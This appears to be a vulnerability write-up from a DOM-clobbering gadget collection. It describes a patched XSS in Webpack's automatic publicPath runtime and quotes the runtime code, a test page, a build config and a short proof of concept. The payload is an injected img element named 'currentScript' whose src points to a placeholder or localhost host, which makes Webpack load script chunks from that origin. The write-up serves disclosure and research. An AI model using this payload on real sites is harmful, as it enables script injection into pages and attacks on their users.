## Webpack

### Meta

+ Library: Webpack
+ Stars: 64.4K
+ Version: v5.93.0
+ Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
+ Impact: XSS
+ Status: Patched
+ CVE: CVE-2024-XXXXX
+ Foundby: TheHulk

### Library

URL: Self hosted

### Vulnerable Code Snippet

`webpack/runtime/publicPath`
```javascript
var scriptUrl;
if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
var document = __webpack_require__.g.document;
if (!scriptUrl && document) {
	if (document.currentScript)
		scriptUrl = document.currentScript.src;
	if (!scriptUrl) {
		var scripts = document.getElementsByTagName("script");
		if(scripts.length) {
			var i = scripts.length - 1;
			while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
		}
	}
}
// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
__webpack_require__.p = scriptUrl;
```

`webpack/runtime/jsonp chunk loading`
```javascript
function loadUpdateChunk(chunkId, updatedModulesList) {
	currentUpdatedModulesList = updatedModulesList;
	return new Promise((resolve, reject) => {
		waitingUpdateResolves[chunkId] = resolve;
		// start update chunk loading
		var url = __webpack_require__.p + __webpack_require__.hu(chunkId);
		// create error before stack unwound to get useful stacktrace later
		var error = new Error();
		var loadingEnded = (event) => {
			if(waitingUpdateResolves[chunkId]) {
				waitingUpdateResolves[chunkId] = undefined
				var errorType = event && (event.type === 'load' ? 'missing' : event.type);
				var realSrc = event && event.target && event.target.src;
				error.message = 'Loading hot update chunk ' + chunkId + ' failed.\n(' + errorType + ': ' + realSrc + ')';
				error.name = 'ChunkLoadError';
				error.type = errorType;
				error.request = realSrc;
				reject(error);
			}
		};
		__webpack_require__.l(url, loadingEnded);
	});
}
```

`webpack/runtime/load script`
```javascript
__webpack_require__.l = (url, done, key, chunkId) => {
	if(inProgress[url]) { inProgress[url].push(done); return; }
	var script, needAttach;
	if(key !== undefined) {
		var scripts = document.getElementsByTagName("script");
		for(var i = 0; i < scripts.length; i++) {
			var s = scripts[i];
			if(s.getAttribute("src") == url || s.getAttribute("data-webpack") == dataWebpackPrefix + key) { script = s; break; }
		}
	}
	if(!script) {
		needAttach = true;
		script = document.createElement('script');

		script.charset = 'utf-8';
		script.timeout = 120;
		if (__webpack_require__.nc) {
			script.setAttribute("nonce", __webpack_require__.nc);
		}
		script.setAttribute("data-webpack", dataWebpackPrefix + key);

		script.src = url;
	}
	inProgress[url] = [done];
	var onScriptComplete = (prev, event) => {
		// avoid mem leaks in IE.
		script.onerror = script.onload = null;
		clearTimeout(timeout);
		var doneFns = inProgress[url];
		delete inProgress[url];
		script.parentNode && script.parentNode.removeChild(script);
		doneFns && doneFns.forEach((fn) => (fn(event)));
		if(prev) return prev(event);
	}
	var timeout = setTimeout(onScriptComplete.bind(null, undefined, { type: 'timeout', target: script }), 120000);
	script.onerror = onScriptComplete.bind(null, script.onerror);
	script.onload = onScriptComplete.bind(null, script.onload);
	needAttach && document.head.appendChild(script);
};
```

## More Details 

```
<html>
<head>
    <title>Webpack Gadgets</title>
</head>
<body>
<img name="currentScript" src="https://xxx.xxxx.xxx"></img>


<script src="https://raw.githubusercontent.com/xxxxxxxxxxxx/dom-clobbering-collection/main/domc-gadgets-assets/webpack/dist/webpack-gadgets.bundle.js?token=GHSAT0AAAAAACHOWGIH7SZYJ4GGACO6R4ZOZVDEPLQ"></script>
</body>
</html>
```

The `webpack.config.js` to generate the bundle can be found below. Note that, to avoid `__webpack_require__.p` being set as a fixed value, the config shouldn't set the `output.publicPath` field to a fix string.

```
module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    // publicPath: '/dist/', // this line will make __webpack_require__.p = "/dist/";
  },
  target: 'web',
  mode: 'development',
};
```

Webpack's generated code differes significantly for each use. Ensure that the code snippets appear, then browse the network requests to see the URLs that are requested. Some users may configure their public path differently. Fingerprint may not work if Webpack is configured to not produce source maps.


## PoC

```html
<!--Library-->
<script src="./dist/webpack-gadgets.bundle.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="http://localhost:9999"></img>
<!--Payload-->
```